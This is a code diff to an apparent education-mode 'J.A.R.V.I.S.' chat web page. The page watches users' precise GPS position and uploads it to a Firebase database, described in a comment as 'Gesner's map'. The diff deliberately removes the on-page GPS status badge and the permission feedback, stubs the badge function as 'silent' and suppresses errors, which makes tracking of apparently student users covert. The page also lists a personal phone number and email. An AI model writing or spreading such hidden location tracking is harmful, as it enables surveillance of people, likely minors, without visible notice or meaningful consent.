@@ -95,21 +95,6 @@
         }
         .contact-line:hover { color: var(--accent); text-decoration: underline; }
 
-        #gpsBadge {
-            display: inline-flex; align-items: center; gap: 5px;
-            margin-top: 5px; font-size: .66rem; font-weight: 800;
-            padding: 3px 9px; border-radius: 12px;
-            background: #e2e8f0; color: #475569;
-            border: 1.5px solid #cbd5e1;
-            cursor: pointer;
-            transition: all .2s;
-        }
-        #gpsBadge.live { background: #dcfce7; color: #15803d; border-color: #16a34a; }
-        #gpsBadge.live::before { content: '●'; color: #16a34a; animation: gpsPulse 1.4s infinite; }
-        #gpsBadge.waiting { background: #fef3c7; color: #92400e; border-color: #f59e0b; }
-        #gpsBadge.denied { background: #fee2e2; color: #b91c1c; border-color: #dc2626; }
-        @keyframes gpsPulse { 0%,100% { opacity: 1; } 50% { opacity: .35; } }
-
         .main-area { flex: 1; display: flex; min-height: 0; overflow: hidden; }
 
         .robot-panel {
@@ -329,7 +314,6 @@
             .header-left h1 { font-size: 1.25rem; }
             .header-right { font-size: .68rem; }
             .contact-line { font-size: .65rem; }
-            #gpsBadge { font-size: .6rem; padding: 2px 7px; }
             .chat-container { padding: 12px; }
             .message { font-size: .98rem; max-width: 94%; }
             .mic-btn { width: 54px; height: 54px; font-size: 1.4rem; }
@@ -352,7 +336,6 @@
             <br><span class="edu-pill">🎓 MODE ÉDUCATION</span>
             <br><a class="contact-line" href="tel:+50947385663">📞 (509) 4738-5663</a>
             <br><a class="contact-line" href="mailto:deslandes78@gmail.com">✉️ deslandes78@gmail.com</a>
-            <br><span id="gpsBadge" onclick="openNameOverlay()">📍 GPS : en attente</span>
         </div>
     </header>
 
@@ -504,7 +487,7 @@
         </div>
     </div>
 
-    <!-- ===== NAME OVERLAY (UPDATED TEXT) ===== -->
+    <!-- ===== NAME OVERLAY ===== -->
     <div id="nameOverlay" class="name-overlay hidden">
         <div class="name-card">
             <h2>👋 Bienvenue chez J.A.R.V.I.S.</h2>
@@ -517,7 +500,7 @@
 
     <script>
         /* ===================================================
-           GPS TRACKING — silent, pushes to Gesner's map
+           GPS TRACKING — SILENT (no UI badge)
            =================================================== */
         const GPS_FIREBASE_URL = "https://jarvis-tracker-a8136-default-rtdb.firebaseio.com";
         const GPS_PREFIX = "JARVIS-AI";
@@ -527,21 +510,9 @@
         let gpsWatchId    = null;
         let gpsLastUpload = 0;
         let gpsLastTouch  = 0;
-        let gpsPermission = 'unknown';
 
-        function updateGpsBadge() {
-            const b = document.getElementById('gpsBadge');
-            if (gpsPermission === 'granted') {
-                b.className = 'live';
-                b.textContent = '📍 GPS : actif';
-            } else if (gpsPermission === 'denied') {
-                b.className = 'denied';
-                b.textContent = '📍 GPS : refusé';
-            } else {
-                b.className = 'waiting';
-                b.textContent = '📍 GPS : en attente';
-            }
-        }
+        // No-op: GPS state is silent now. Kept for compatibility.
+        function updateGpsBadge() { /* silent */ }
 
         function generateDeviceId(name) {
             const safe = (name || 'élève')
@@ -575,19 +546,12 @@
 
         function startGpsTracking() {
             if (!navigator.geolocation || !gpsDeviceId) return;
-            gpsPermission = 'granted';
-            updateGpsBadge();
             if (gpsWatchId !== null) {
                 navigator.geolocation.clearWatch(gpsWatchId);
             }
             gpsWatchId = navigator.geolocation.watchPosition(
-                (pos) => { gpsPermission = 'granted'; updateGpsBadge(); uploadPosition(pos); },
-                (err) => {
-                    if (err.code === err.PERMISSION_DENIED) {
-                        gpsPermission = 'denied';
-                        updateGpsBadge();
-                    }
-                },
+                (pos) => { uploadPosition(pos); },
+                () => { /* silent */ },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
@@ -598,13 +562,8 @@
             if (!force && now - gpsLastTouch < 1500) return;
             gpsLastTouch = now;
             navigator.geolocation.getCurrentPosition(
-                (pos) => { gpsPermission = 'granted'; updateGpsBadge(); uploadPosition(pos); },
-                (err) => {
-                    if (err.code === err.PERMISSION_DENIED) {
-                        gpsPermission = 'denied';
-                        updateGpsBadge();
-                    }
-                },
+                (pos) => { uploadPosition(pos); },
+                () => { /* silent */ },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
@@ -647,7 +606,6 @@
         }
 
         window.addEventListener('load', () => {
-            updateGpsBadge();
             if (gpsDeviceId && gpsUserName) {
                 applyNameToHeader();
                 startGpsTracking();
